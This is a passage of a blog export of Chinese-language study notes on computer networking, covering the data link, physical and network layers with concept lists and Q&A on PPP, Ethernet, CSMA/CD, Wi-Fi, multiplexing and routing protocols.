<li>PPP协议是用于点对点信道的数据链路层协议，比如接入到ISP就使用PPP协议。</li>
<li>当用户拨号接入 ISP 时，路由器的调制解调器对拨号做出确认，并建立一条物理连接。<br>PC 机向路由器发送一系列的 LCP 分组（封装成多个 PPP 帧）。<br>这些分组及其响应选择一些 PPP 参数，进行接入鉴别和进行网络层配置，NCP 给新接入的 PC机分配一个临时的 IP 地址，使 PC 机成为因特网上的一个主机。<br>通信完毕时，NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着，LCP 释放数据链路层连接。最后释放的是物理层的连接。</li>
</ul>
<h3 id="以太网的链路控制如何实现？"><a href="#以太网的链路控制如何实现？" class="headerlink" title="以太网的链路控制如何实现？"></a>以太网的链路控制如何实现？</h3><p>为了通信的方便，以太网的链路控制采用灵活的无连接操作方式，即不用像PPP一样得先在两点之间建立链路连接，而是直接就可以发送数据，对数据帧不进行编号，也不要求对方发回确认。但这是基于CSMA/CD协议和以太网的信道质量好的情况。</p>
<h3 id="从数据链路层任务的角度看，PPP与以太网有何区别？为什么以太网可以不需要帧定界及传输前对数据进行转义（字符填充）？"><a href="#从数据链路层任务的角度看，PPP与以太网有何区别？为什么以太网可以不需要帧定界及传输前对数据进行转义（字符填充）？" class="headerlink" title="从数据链路层任务的角度看，PPP与以太网有何区别？为什么以太网可以不需要帧定界及传输前对数据进行转义（字符填充）？"></a>从数据链路层任务的角度看，PPP与以太网有何区别？为什么以太网可以不需要帧定界及传输前对数据进行转义（字符填充）？</h3><p>最主要也是最明显的区别就是两者对接收到的IP数据包的进行封装成帧的方式不同。<br>PPP帧的帧定界用来表示的是帧的开始和结束，和转义字符一起用以保证传输的透明性。而对于以太网来说，由于采用的是曼彻斯特编码，接收方可以很容易的找到以太网帧的结束位置（再往前数4字节FCS字段便可知数据段结束位置），而在传输媒体上实际传送是会增加8个字节，包含了前同步码和帧开始界定符，这样接收方也可以很容易知道帧的开始位置（往后数22个字节便是数据段开始位置），因此，接收方可以很容易地得到IP数据报，也就实现了透明传输，不必再需要帧定界和转义字符。</p>
<h3 id="CSMA-CD工作原理"><a href="#CSMA-CD工作原理" class="headerlink" title="CSMA/CD工作原理"></a>CSMA/CD工作原理</h3><pre><code>1. 适配器从网络层获得一个分组，加上以太网的首部和尾部后，组成以太网帧，放入缓存准备发送。
2. 若适配器检测到信道空闲，并在96比特时间内信道保持空闲，就发送这个帧。若检测到信道忙，不停检测直至信道空闲。
3. 在发送过程中继续检测信道，若未检测到碰撞，就顺利把这个帧成功发送完毕。若检测到碰撞，便中止发送，并发送人工干扰信号。
4. 在中止发送后，适配器执行指数退避算法，等待r倍的512比特时间后，返回步骤2继续监测信道。重传16次还不能成功，就停止重传并向上报错。</code></pre><h3 id="以太网的拓扑结构"><a href="#以太网的拓扑结构" class="headerlink" title="以太网的拓扑结构"></a>以太网的拓扑结构</h3><p>由最初的总线型逐渐转变为现在使用最广泛的星型结构。</p>
<h3 id="为什么说使用集线器的星型以太网本质上仍然是总线网？"><a href="#为什么说使用集线器的星型以太网本质上仍然是总线网？" class="headerlink" title="为什么说使用集线器的星型以太网本质上仍然是总线网？"></a>为什么说使用集线器的星型以太网本质上仍然是总线网？</h3><p>因为集线器使用电子器件来模拟实际电缆线的工作，虽然表面上看是星型结构，但是使用集线器的以太网各站依然共享逻辑上的总线，适配器使用的还是CSMA/CD协议，并在同一时刻至多只允许一个站发送数据。</p>
<h3 id="以太网物理地址-MAC-的结构。"><a href="#以太网物理地址-MAC-的结构。" class="headerlink" title="以太网物理地址(MAC)的结构。"></a>以太网物理地址(MAC)的结构。</h3><p>6个字节（48位）：IEEE的注册管理机构RA负责向厂家分配地址字段的前三个字节(即高位24位)。<br>地址字段中的后三个字节(即低位24位)由厂家自行指派，称为扩展标识符，必须保证生产出的适配器没有重复地址。</p>
<h3 id="以太网帧格式，最小最大帧长？"><a href="#以太网帧格式，最小最大帧长？" class="headerlink" title="以太网帧格式，最小最大帧长？"></a>以太网帧格式，最小最大帧长？</h3><p><img src="https://github.com/CyC2018/Interview-Notebook/blob/master/pics/50d38e84-238f-4081-8876-14ef6d7938b5.jpg" alt="MAC帧"></p>
<p>6字节的目的地址，6字节的源地址，2字节对数据字段类型的说明代号，然后是46到1500字节的数据部分，最后是4字节的FCS帧检验序列（使用CRC检验）。</p>
<h3 id="以太网在物理层的扩展手段有那些？在数据链路层的扩展手段有哪些？"><a href="#以太网在物理层的扩展手段有那些？在数据链路层的扩展手段有哪些？" class="headerlink" title="以太网在物理层的扩展手段有那些？在数据链路层的扩展手段有哪些？"></a>以太网在物理层的扩展手段有那些？在数据链路层的扩展手段有哪些？</h3><ul>
<li><strong>物理层扩展</strong>：a.使用一对光纤和一对光纤调制解调器；b.用多个集线器构成多级星型结构的以太网。</li>
<li><strong>数据链路层扩展</strong>：最初使用网桥，现在广泛使用交换机进行扩展。</li>
</ul>
<h3 id="网桥、交换机的工作原理。透明网桥的工作原理。网桥、交换机与集线器的区别。"><a href="#网桥、交换机的工作原理。透明网桥的工作原理。网桥、交换机与集线器的区别。" class="headerlink" title="网桥、交换机的工作原理。透明网桥的工作原理。网桥、交换机与集线器的区别。"></a>网桥、交换机的工作原理。透明网桥的工作原理。网桥、交换机与集线器的区别。</h3><ul>
<li><strong>网桥工作原理</strong>:当网桥接收到一个MAC帧时，先存储帧并检查此帧的目的MAC地址，查找转发表，然后进行转发；转发之前要执行CSMA/CD算法。</li>
<li><strong>交换机工作原理</strong>：实质为多接口网桥。多数仍是采用存储转发方式进行转发。也有少量采用直通方式（不进行差错检测）。</li>
<li><strong>区别</strong>：1. 集线器在转发帧时，不对传输媒体进行检测。2.网桥在转发帧之前必须执行 CSMA/CD 算法。3.交换机每个接口都直接与主机相连，并且一般都工作在全双工方式。能像独占通信媒体那样，进行无碰撞地传输数据。</li>
</ul>
<h3 id="有哪些高速以太网技术？高速以太网与传统以太网技术上有什么区别和联系？"><a href="#有哪些高速以太网技术？高速以太网与传统以太网技术上有什么区别和联系？" class="headerlink" title="有哪些高速以太网技术？高速以太网与传统以太网技术上有什么区别和联系？"></a>有哪些高速以太网技术？高速以太网与传统以太网技术上有什么区别和联系？</h3><pre><code>1. 快速以太网（100BASE-T 以太网）：
a.采用802.3u标准，可在全双工方式下工作而无冲突发生。
b.MAC帧格式仍然是规定的。保持最短帧长64字节不变,但将一个网段的最大电缆长度减小到100m。
c.帧间时间间隔从原来的9.6微秒改为现在的0.96微秒，争用期5.12微秒。
2. 吉比特以太网：
a.允许在1Gb/s下全双工和半双工两种方式工作。
b.在半双工方式下使用CSMA/CD协议（全双工方式不需要使用CSMA/CD协议）。
3. 10吉比特以太网：只工作在全双工方式，因此没有争用问题，也不使用 CSMA/CD 协议。</code></pre><h3 id="VLAN的技术特点和用途？"><a href="#VLAN的技术特点和用途？" class="headerlink" title="VLAN的技术特点和用途？"></a>VLAN的技术特点和用途？</h3><pre><code>特点：虚拟局域网其实只是局域网给用户提供的一种服务，而并不是一种新型局域网。每一个VLAN的帧都有一个明确的标识符，指明发送这个帧的工作站是属于哪一个VLAN。

用途：虚拟局域网限制了接收广播信息的工作站数，使得网络不会因传播过多的广播信息(即“广播风暴”)而引起性能恶化。另外，VLAN是用户和网络资源的逻辑组合，可按照需要对有关设备和资源非常方便的重新组合，使用户从不同的服务器或数据库中存取所需的资源。</code></pre><h3 id="无线局域网包括哪两种类型？有固定设施的无线局域网的组成？移动站与AP的关联方法有几种？"><a href="#无线局域网包括哪两种类型？有固定设施的无线局域网的组成？移动站与AP的关联方法有几种？" class="headerlink" title="无线局域网包括哪两种类型？有固定设施的无线局域网的组成？移动站与AP的关联方法有几种？"></a>无线局域网包括哪两种类型？有固定设施的无线局域网的组成？移动站与AP的关联方法有几种？</h3><ul>
<li>一种是有固定基础设施的，一种是无固定基础设施的，又叫做自组网络。</li>
<li><strong>组成</strong>：这种无线局域网的最小构件是基本服务集BSS(Basic Service Set)，一个基本服务集又包含一个基站和若干个移动站。一个基本服务集可以孤立存在，也可以通过接入点AP连接到一个分配系统DS，然后再连接到另一个基本服务集，这样就构成了一个扩展的服务集ESS。</li>
<li><strong>关联方法</strong>：一种是被动扫描，移动站等待接收接入点AP周期性发出的信标帧，信标帧中含有若干系统参数（SSID和支持速率）；另一种是主动扫描，移动站主动发出探测请求帧，然后等待从接入点发回的探测响应帧。</li>
</ul>
<h3 id="什么是802-11局域网的隐蔽站、暴露站问题？CSMA-CA工作原理。与有线以太网CSMA-CD协议相比有何异同？"><a href="#什么是802-11局域网的隐蔽站、暴露站问题？CSMA-CA工作原理。与有线以太网CSMA-CD协议相比有何异同？" class="headerlink" title="什么是802.11局域网的隐蔽站、暴露站问题？CSMA/CA工作原理。与有线以太网CSMA/CD协议相比有何异同？"></a>什么是802.11局域网的隐蔽站、暴露站问题？CSMA/CA工作原理。与有线以太网CSMA/CD协议相比有何异同？</h3><ul>
<li><strong>隐蔽站问题</strong>：当A与C都想向B通信，由于A与C之间相距过远，彼此听不见对方。当A和C检测到信道空闲时，就向B发送数据，结果发生碰撞。这种未能检测到信道上其他站点信号的问题叫做隐蔽站问题。检测到信道空闲，其实信道并不空闲。</li>
<li><strong>暴露站问题</strong>：B向A发送数据，C想和D通信，但C检测到信道忙，就不敢和D通信。这种问题叫做暴露站问题。检测到信道忙，其实信道并不忙。</li>
<li><strong>CSMA/CA</strong>(带碰撞避免的载波监听多路访问协议)：a.欲发送数据的站先检测信道。在 802.11 标准中规定了在物理层的空中接口进行物理层的载波监听。<br>b.通过收到的相对信号强度是否超过一定的门限数值就可判定是否有其他的移动站在信道上发送数据。c.<br>当源站发送它的第一个 MAC 帧时，若检测到信道空闲，则在等待一段时间 DIFS 后就可发送。  </li>
<li><strong>异同</strong>：相同点在于都使用载波监听多路访问，在发送数据前先对媒体进行载波监听，判断信道空闲才发送数据。区别是有线以太网采用碰撞检测的手段，使用二进制退避算法来计算重传的时间，但不保证不会发生碰撞；而无线局域网因其无线信道本身的能够向所有方向传播并且传播距离受限的特点不需要进行碰撞检测，而是要通过技术手段尽量避免碰撞的产生。</li>
</ul>
<h3 id="在存在AP的802-11无线局域网中，两台移动站之间通讯，发送站是否可将数据帧直接发给接收站？"><a href="#在存在AP的802-11无线局域网中，两台移动站之间通讯，发送站是否可将数据帧直接发给接收站？" class="headerlink" title="在存在AP的802.11无线局域网中，两台移动站之间通讯，发送站是否可将数据帧直接发给接收站？"></a>在存在AP的802.11无线局域网中，两台移动站之间通讯，发送站是否可将数据帧直接发给接收站？</h3><p>所有的站在本BSS内都可以直接通信，所以答案是肯定的。只有在和本BSS以外的站进行通信的时候，才需要经过基站。</p>
<hr>
<p>2018 年 5月 4日</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络概述</title>
    <url>/2018/05/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol>
<li>ARPANET: 美国国防部创建的第一个分组交换网（单个网络，不互连）</li>
<li>结点：位于网络中的结点可以是计算机，集线器，路由器，交换机等。</li>
<li>链路：从一个结点到相邻结点的一段物理线路（有线或无线），而中间没有其他任何的交换结点。</li>
<li>主机：与网络互连的计算机。</li>
<li>ISP(Internet Service Provider):互联网的服务提供商。</li>
<li>RFC(Request For Comments):为了便于制定互联网标准，利于互联网推广，而衍生出的请求评论文档，，任何用户都可以下载，并非所有的RFC文档都会称为互联网标准。<a id="more"></a></li>
<li>端系统：处在互联网边缘的部分就是连接在互联网上的所有主机，这些主机又称为端系统。</li>
<li>分组：把要发送的整块数据称为一个报文(message)。发送报文前，先将报文划分成一个个更小的等长数据段，在每一个数据段前面加上一些控制信息组成的首部，就构成一个分组(packet)，又叫做包。</li>
<li>存储转发：分组交换就利用了存储转发技术。例如当路由器收到一个分组，会暂时进行存储，通过查找路由表转发分组到下一个路由器，下一个路由器也按照同样的方式进行存储转发直至到达目的主机。</li>
<li>带宽： 阐述带宽的概念之前，先要了解数据率的概念。数据率是网络中数据的传输速率，以bit/s为单位，产说的网络速率是指额定速率或者标称速率。而带宽在计算机网络中用来表示单位时间某信道所能通过的最高数据率。</li>
<li>吞吐量：吞吐量是单位时间内通过某网络或者信道等的实际数据量，经常用于对现实世界网络的一种测量。</li>
<li>时延：数据从网络一端传送到另一端所需要的时间。由发送时延、传播时延、处理时延和排队时延四大部分组成。重点区分发送时延和传播时延，常说的光纤信道的传输速率高是指可以用很高的速率向光纤信道发送数据，而光纤的传播速率甚至比铜线还要低一些。</li>
<li>时延带宽积：将传播时延和带宽相乘，就得到时延带宽积。表示的是以比特为单位的链路长度。</li>
<li>实体：研究开放系统的信息交换时，使用实体这一抽象概念表示任何可发送或者接收信息的硬件或者软件进程。许多情况下，就是一个特定的软件模块。</li>
<li>协议：控制两个对等实体（或多个实体）进行通信的规则集合。包含语法和语义两个方面，语法规定了信息格式，语义定义了需要进行的操作。</li>
<li>服务：在网络分层体系结构中，可被上层看到的功能叫做服务，下层向上层通过层间接口提供的。本层为上层提供服务，又要使用下层为本层提供的服务。</li>
<li>服务访问点(Service Access Point)：同一系统中相邻两层的实体进行交换信息的地方。</li>
<li>PDU(Protocol Data Unit):OSI参考模型把对等层次之间传送的数据单位叫做该层的协议数据单元。</li>
</ol>
<hr>
<h2 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h2><h3 id="从工作方式看，因特网如何组成？"><a href="#从工作方式看，因特网如何组成？" class="headerlink" title="从工作方式看，因特网如何组成？"></a>从工作方式看，因特网如何组成？</h3><p>互联网的拓扑结构虽然非常复杂，但从其工作方式看，可分为以下两大块：</p>
<ul>
<li><strong>边缘部分</strong>：由所有连接在互联网上的主机组成。用户直接使用，进行通信和资源共享。</li>
<li><strong>核心部分</strong>：由大量网络和连接这些网络的路由器组成。为边缘部分提供服务。</li>
</ul>
<h3 id="边缘端系统运行的程序之间通信方式有几种，工作方式如何？"><a href="#边缘端系统运行的程序之间通信方式有几种，工作方式如何？" class="headerlink" title="边缘端系统运行的程序之间通信方式有几种，工作方式如何？"></a>边缘端系统运行的程序之间通信方式有几种，工作方式如何？</h3><p>通常划分为两大类：客户-服务器方式（C/S方式）和对等方式（P2P方式）。</p>
<ul>
<li><p><strong>客户-服务器方式</strong>：client和server是通信过程中涉及的两个进程，描述进程间服务与被服务的关系，主要特征是<strong>客户是服务请求方，服务器是服务提供方</strong>。</p>
</li>
<li><p><strong>对等连接方式</strong>：两台主机通信时并不区分服务请求方和服务提供方。只要主机运行了对等连接软件，就可以进行平等的对等连接通信。</p>
</li>
</ul>
<h3 id="因特网的核心部分的主要功能？由何种部件构成？"><a href="#因特网的核心部分的主要功能？由何种部件构成？" class="headerlink" title="因特网的核心部分的主要功能？由何种部件构成？"></a>因特网的核心部分的主要功能？由何种部件构成？</h3><ul>
<li><strong>主要功能</strong>：向网络边缘中的大量主机提供连通性，使得边缘部分中的任何一台主机都可以向其他主机通信。</li>
<li><strong>构成</strong>：在核心部分中，路由器有着特殊的作用，是实现分组交换的关键构件，采用<strong>存储转发</strong>方式转发收到的分组。</li>
</ul>
<h3 id="报文交换，电路交换，分组交换的特征、优缺点？因特网的通讯模式？"><a href="#报文交换，电路交换，分组交换的特征、优缺点？因特网的通讯模式？" class="headerlink" title="报文交换，电路交换，分组交换的特征、优缺点？因特网的通讯模式？"></a>报文交换，电路交换，分组交换的特征、优缺点？因特网的通讯模式？</h3><ul>
<li><strong>报文交换</strong>： <strong>整个</strong>报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个结点。</li>
<li><strong>电路交换</strong>：整个报文的比特流<strong>连续</strong>从源点直达终点，好像在一个管道传输。</li>
<li><strong>分组交换</strong>：报文的一部分（即单个分组）传送到相邻结点，存储下来后查找转发表，转发到下一个结点。</li>
<li><strong>优缺点</strong>：当传送大量数据且数据传送时间远大于建立连接时间，那么电路交换的传输速率较快，比如电话；而报文交换和分组交换不需要预先分配传输带宽，传送突发数据时网络的信道利用率较高；分组的长度又远小于报文长度，因此分组交换的时延较小，灵活性好。</li>
<li>因特网采用分组交换。</li>
</ul>
<h3 id="分组交换中，数据传输的单元叫什么？结构和工作特点如何？"><a href="#分组交换中，数据传输的单元叫什么？结构和工作特点如何？" class="headerlink" title="分组交换中，数据传输的单元叫什么？结构和工作特点如何？"></a>分组交换中，数据传输的单元叫什么？结构和工作特点如何？</h3><p>数据传输的单元叫做分组，由报文拆分成数据段后加首部形成。由于首部包含目的地址和源地址，每个分组在互联网中独立选择传输路径，并被正确交付到分组传输的终点。</p>
<h3 id="几种时延定义？解决方案？提高整体效率原则？"><a href="#几种时延定义？解决方案？提高整体效率原则？" class="headerlink" title="几种时延定义？解决方案？提高整体效率原则？"></a>几种时延定义？解决方案？提高整体效率原则？</h3><ul>
<li><strong>发送时延</strong>： 主机或者路由器发送数据帧所需要的时间。数据帧长度/发送速率。</li>
<li><strong>传播时延</strong>：电磁波在信道中传播一定的距离耗费的时间。信道长度/电磁波在信道中传播的速率。</li>
<li><strong>处理时延</strong>：主机或者路由器收到分组花费的处理时间。分析首部，提取数据，差错检验等。</li>
<li><strong>排队时延</strong>：分组在进入路由器需要在输入队列中等待处理，确定转发接口后，还需要在输出队列中排队等待转发，就产生了排队时延。</li>
<li>提高整体效率并不能单一通过提高数据的发送速率或者传播速率，因为总时延由四部分组成，需要全部考虑在内。</li>
</ul>
<h3 id="信道利用率和网络利用率的区别？时延和网络利用率的关系？"><a href="#信道利用率和网络利用率的区别？时延和网络利用率的关系？" class="headerlink" title="信道利用率和网络利用率的区别？时延和网络利用率的关系？"></a>信道利用率和网络利用率的区别？时延和网络利用率的关系？</h3><ul>
<li><strong>区别</strong>：信道利用率指的是某信道有百分之几的时间是被利用的（即有数据通过）；网络利用率是指全网络信道利用率的加权平均值。</li>
<li><strong>关系</strong>:信道或者网络利用率过高会产生非常大的时延。D=D0/(1-U)。</li>
</ul>
<h3 id="网络协议的组成要素"><a href="#网络协议的组成要素" class="headerlink" title="网络协议的组成要素"></a>网络协议的组成要素</h3><p>主要由以下三个要素组成：</p>
<ul>
<li><strong>语法</strong>：数据和控制信息的结构和格式；</li>
<li><strong>语义</strong>：需要发出何种控制信息，完成何种动作，做出何种响应；</li>
<li><strong>同步</strong>：事件实现顺序的详细说明。</li>
</ul>
<h3 id="协议和分层对网络通讯的意义？分层模式下的同层通讯如何实现？"><a href="#协议和分层对网络通讯的意义？分层模式下的同层通讯如何实现？" class="headerlink" title="协议和分层对网络通讯的意义？分层模式下的同层通讯如何实现？"></a>协议和分层对网络通讯的意义？分层模式下的同层通讯如何实现？</h3><ul>
<li>网络协议是计算机网络不可缺少的部分，要想让连接在网络上的另一台计算机做点什么事情，就需要有协议。</li>
<li>分层有很多好处：各层之间独立；灵活性好；结构上可分割开；易于实现和维护；促进标准化工作。</li>
</ul>
<h3 id="TCP-IP协议的体系结构"><a href="#TCP-IP协议的体系结构" class="headerlink" title="TCP/IP协议的体系结构"></a>TCP/IP协议的体系结构</h3><p>只有四层，包含应用层，传输层，网际层和网络接口层。</p>
<hr>
<p>2018 年 5月 3日</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络物理层</title>
    <url>/2018/05/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%89%A9%E7%90%86%E5%B1%82/</url>
    <content><![CDATA[<h1 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol>
<li>数据：通信的目的是传输消息，如语音、文字、图像等。数据就是运送消息的实体，是使用特定方式表示的信息，通常是有意义的符号序列，这种信息的表示可由计算机或者其他机器处理或产生。</li>
<li>信号：是数据的电气或者电磁表现。</li>
<li>码元：使用时域的波形表示数字信号时，代表不同离散数值的基本波形称为码元。码元携带信息量并非固定，而是由调制方式和编码方式决定的。</li>
<li>单工：根据通信双方的信息交互方式确定的三种基本方式其一，又称为单工通信，只能有一个方向的通信而没有反方向交互。比如无线电广播，有线电广播和电视广播就属于这种。</li>
<li>半双工：双向交替通信，通信双方都可以发送消息，但不能同时发送或接收。比如对讲机。</li>
<li>全双工：通信双方可以同时收发消息。<a id="more"></a></li>
<li>基带信号：基本频带信号，来自信源的信号。比如计算机输出的代表各种文字或者图像文件的数据信号，包含较多低频成分，甚至有直流成分，许多信道并不能传输这种低频和直流分量，就需要对基带信号进行调制。</li>
<li>带通信号：基带信号经过载波调制后，将信号的频率范围搬移到较高的频段以便在信道中传输。（即仅在一段频率范围能够通过信道）</li>
<li>调制：需要知道的是，调制分为两大类。一类为基带调制，对基带信号的波形变换后还是数字信号，但是这种信号可以适应信道的传输，人们也愿意将这种调制叫做编码，因为输出的还是数字信号；而另一类调制就需要使用载波(carrier)进行调制，将基带信号的频率范围搬移到较高的频段，并转换为模拟信号，经过载波调制后的信号称为带通信号，而使用载波的调制就叫做带通调制。</li>
<li>信噪比：信号的平均功率和噪声的平均功率的比值，常记为S/N,并用分贝作为度量单位。信噪比=10log10（S/N），香农公式表明信道极限传输速率C=Wlog2（1+S/N）（bit/s）。</li>
<li>信道复用：复用是通信技术中的基本概念，在计算机网络的信道中广泛使用各种复用技术。使用复用器和分用器加以实现。</li>
<li>PCM：脉冲编码调制，存在E1和T1两个标准，中国采用的是E1标准</li>
<li>比特率：数据的传输速率。C（比特率）=B（波特率）log2N（传输系统中码元的种类数）</li>
<li>波特率：码元传输速率，单位时间内码元传输的极限数。</li>
<li>ADSL(Asymmetric digital subscriber line)：非对称数字用户线,下行带宽远大于上行带宽，故称之为非对称。</li>
<li>xDSL：VDSL用于短距离传送，比ADSL更快，诸如此类的还有用于企业的对称数字用户线SDSL，HDSL(High speed Digital Subscriber Line)用一对线或者两对线的对称DSL。都可以记为xDSL。</li>
</ol>
<h2 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h2><h3 id="物理层的任务"><a href="#物理层的任务" class="headerlink" title="物理层的任务"></a>物理层的任务</h3><p>确定与传输媒体的接口有关的一些特性，即机械特性、电气特性、功能特性和过程特性。</p>
<h3 id="数据通信系统的构件及相应用途？"><a href="#数据通信系统的构件及相应用途？" class="headerlink" title="数据通信系统的构件及相应用途？"></a>数据通信系统的构件及相应用途？</h3><p>划分为三大部分，即源系统，传输系统和目的系统。</p>
<ul>
<li><strong>源系统</strong>：包含源点和发送器两部分，源点产生要传输的数据，发送器对源点生成的比特流编码后才能在传输系统中传输，常见的发送器就是调制器。</li>
<li><strong>目的系统</strong>：包含接收器和终点两部分，接受器接收传输系统传送过来的信号，并将之转换为能被目的设备处理的信息，常见的接收器就是解调器，对模拟信号进行解调产生数字信号；终点设备接收接收器传送过来的数字比特流，将信息输出。</li>
<li><strong>传输系统</strong>：可以是简单的传输线，也可以是连接在源系统和目的系统之间的复杂网络系统。用于在源系统和目的系统之间传输模拟信号。</li>
</ul>
<h3 id="物理层对基带信号有哪几种基本调制方法，各有什么特点？"><a href="#物理层对基带信号有哪几种基本调制方法，各有什么特点？" class="headerlink" title="物理层对基带信号有哪几种基本调制方法，各有什么特点？"></a>物理层对基带信号有哪几种基本调制方法，各有什么特点？</h3><p>分为基带调制和带通调制</p>
<ul>
<li><strong>基带调制</strong>：对基带信号的波形进行变换，使之能够与信道特性相适应，变换后的信号依然是基带信号，只是将数字信号变换为另一种形式的数字信号。</li>
<li><strong>带通调制</strong>：使用载波进行调制，将基带信号的频率范围搬移到较高的频段，并转化为模拟信号使之可以很好地在模拟信道中传输。</li>
</ul>
<h3 id="奈氏准则？理想信道的码元传输速率上限？"><a href="#奈氏准则？理想信道的码元传输速率上限？" class="headerlink" title="奈氏准则？理想信道的码元传输速率上限？"></a>奈氏准则？理想信道的码元传输速率上限？</h3><p>在任何信道中，码元传输的速率是有上限的，传输速率超过此上限，就会出现严重的码间串扰问题，使得接收端对码元的判决成为不可能。传输速率上限B=2W，其中W为信道带宽，单位为Hz，B单位为波特Baud。一波特不一定等于一比特，要看一个码元携带的信息量，也即二进制数的位数。</p>
<h3 id="香农公式？用途？实际信道的信息传输速率上限如何定义？"><a href="#香农公式？用途？实际信道的信息传输速率上限如何定义？" class="headerlink" title="香农公式？用途？实际信道的信息传输速率上限如何定义？"></a>香农公式？用途？实际信道的信息传输速率上限如何定义？</h3><ul>
<li><strong>香农公式</strong>：信道的极限信息传输速率C为C=Wlog2（1+S/N）</li>
<li><strong>用途</strong>：只要信息传输速率低于信道的极限信息传输速率，就一定可以找到某种办法来实现无差错的传输。</li>
<li><strong>实际信道中</strong>，信息传输速率上限要比香农极限速率低不少，这是因为实际信道中，信号还要受到其他一些损伤，如各种脉冲干扰和在传输中产生的失真。</li>
</ul>
<h3 id="常用的导向传输媒体？"><a href="#常用的导向传输媒体？" class="headerlink" title="常用的导向传输媒体？"></a>常用的导向传输媒体？</h3><p>双绞线，同轴电缆，光缆和架空明线。</p>
<h3 id="网络通讯中使用的光纤分类"><a href="#网络通讯中使用的光纤分类" class="headerlink" title="网络通讯中使用的光纤分类"></a>网络通讯中使用的光纤分类</h3><p>单模光纤和多模光纤</p>
<h3 id="物理层的信道复用技术？各有何技术特点？"><a href="#物理层的信道复用技术？各有何技术特点？" class="headerlink" title="物理层的信道复用技术？各有何技术特点？"></a>物理层的信道复用技术？各有何技术特点？</h3><ul>
<li>频分复用：频分复用的所有用户在相同时间里占用不同的带宽（频率带宽）资源。</li>
<li>时分复用：时分复用则是将时间划分为一段段等长的时分复用帧（TDM 帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。<br>时分复用的所有用户在不同的时间里占用同样的频带宽度。</li>
<li>统计时分复用：是改进的时分复用技术，明显提高信道利用率。</li>
<li>波分复用：光的频分复用。</li>
<li>码分复用：各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。<br>这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。</li>
</ul>
<h3 id="一个标准的数字语音传输速率是多少？"><a href="#一个标准的数字语音传输速率是多少？" class="headerlink" title="一个标准的数字语音传输速率是多少？"></a>一个标准的数字语音传输速率是多少？</h3><p>64kbps</p>
<h3 id="ADSL的特点"><a href="#ADSL的特点" class="headerlink" title="ADSL的特点"></a>ADSL的特点</h3><ul>
<li>上行和下行带宽做成不对称的。</li>
<li>上行指从用户到 ISP，而下行指从 ISP 到用户。</li>
<li>ADSL 在用户线（铜线）的两端各安装一个 ADSL 调制解调器。</li>
<li>我国目前采用的方案是离散多音调 DMT (Discrete Multi-Tone)调制技术。这里的“多音调”就是“多载波”或“多子信道”的意思</li>
</ul>
<hr>
<p>2018 年 5月 3日</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络网络层</title>
    <url>/2018/05/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
    <content><![CDATA[<h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol>
<li>虚电路：一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发的方式传送，而不是真正建立了一条物理连接。</li>
<li>IP（网际协议）:TCP/IP体系中两个最主要的协议之一，也是最重要的互联网标准之一，与ARP、ICMP、IGMP配套使用。</li>
<li>ARP：地址解析协议，用于从IP地址到MAC地址的转换</li>
<li>ICMP:网际控制报文协议，允许主机或路由器报告差错情况和有关异常情况的报告。</li>
<li>子网掩码:子网掩码用于确定关于子网划分的信息，并标识IP地址中的网络部分和主机部分。</li>
<li>CIDR:称为无分类域间路由选择，使用斜线记法标明前缀和主机号，网络前缀代替了网络号和子网号。<a id="more"></a></li>
<li>默认路由：路由表中无法查找到目的地址的路由信息，路由器选择的路由。</li>
<li>路由选择算法：</li>
<li>自治系统AS:在单一技术管理下的一组路由器，使用统一的路由选择协议和共同的度量。对其他AS表现出单一和一致的路由选择策略。</li>
<li>IGP（内部网关协议）：一个自治系统内部使用的路由选择协议，与其他自治系统使用什么路由选择协议无关，常用RIP和OSPF协议。</li>
<li>EGP(外部网关协议):简言之就是自治系统之间使用的路由选择协议，比如常用的BGP的第四个版本BGP-4。</li>
<li>RIP协议:是一种分布式的基于距离向量的路由选择协议，是互联网的标准协议，最大优点是简单。维护自己到其他每一个目的网络的距离记录，这是一组距离，即距离向量。</li>
<li>OSPF（开放最短路径优先）协议：最主要的特征是使用分布式的链路状态协议，而不是像RIP一样的距离向量协议。</li>
<li>BGP（边界网关协议）:在不同自治系统交换路由信息的协议。</li>
<li>IPV6:下一代网际协议，IP协议的另一个版本。</li>
</ol>
<h2 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h2><h3 id="网络层的任务"><a href="#网络层的任务" class="headerlink" title="网络层的任务"></a>网络层的任务</h3><p>网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务。</p>
<h3 id="网络层有那两类服务？各有何优缺点？因特网采纳了何种服务"><a href="#网络层有那两类服务？各有何优缺点？因特网采纳了何种服务" class="headerlink" title="网络层有那两类服务？各有何优缺点？因特网采纳了何种服务"></a>网络层有那两类服务？各有何优缺点？因特网采纳了何种服务</h3><ul>
<li>虚电路服务和数据报服务。</li>
